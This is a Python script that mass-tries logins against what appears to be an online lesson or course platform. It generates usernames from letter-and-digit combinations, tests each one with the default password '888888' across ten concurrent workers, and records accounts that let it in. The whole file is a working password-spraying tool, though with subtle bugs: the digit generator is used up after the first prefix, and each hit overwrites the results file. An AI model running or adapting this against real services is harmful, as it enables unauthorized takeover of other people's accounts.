import sys
import string
import logging
from itertools import product
from tornado.gen import coroutine, sleep
from tornado.ioloop import IOLoop
from tornado.queues import Queue
from tornado.httpclient import AsyncHTTPClient
from lessonrobot import LessonRobot

q = Queue()
concurrency = 10
filename = 'char_%s_digit_%s.txt' % (sys.argv[1], sys.argv[2])
logging.basicConfig(format="%(asctime)s: %(message)s", level=logging.INFO)
logging.info(filename)

def gen_char(n):
	for comb in product(string.ascii_lowercase, repeat=n):
		yield ''.join(comb)

def gen_digit(n):
	for comb in product(string.digits, repeat=n):
		yield ''.join(comb)

@coroutine
def worker():
	while True:
		username = yield q.get()

		try:
			robot = LessonRobot()
			result = yield robot.login(username, '888888')
			if result:
				logging.info('[Login] %s' % username)

				with open(filename, 'w') as fout:
					fout.write(username)
			else:
				logging.info('[Failed] %s' % username)
		except Exception as e:
			logging.info('[Exception] %s:%s' % (username, e))
			yield q.put(username)

		q.task_done()

@coroutine
def spawner():
	iter_char = gen_char(int(sys.argv[1]))
	iter_digit = gen_digit(int(sys.argv[2]))

	for char in iter_char:
		for digit in iter_digit:
			username = char + digit
			yield q.put(username)
			yield sleep(0.001)

@coroutine
def main():
	for i in xrange(concurrency):
		IOLoop.current().spawn_callback(worker)

	yield spawner()
	yield q.join()
	logging.info('All Done')

IOLoop.current().run_sync(main)
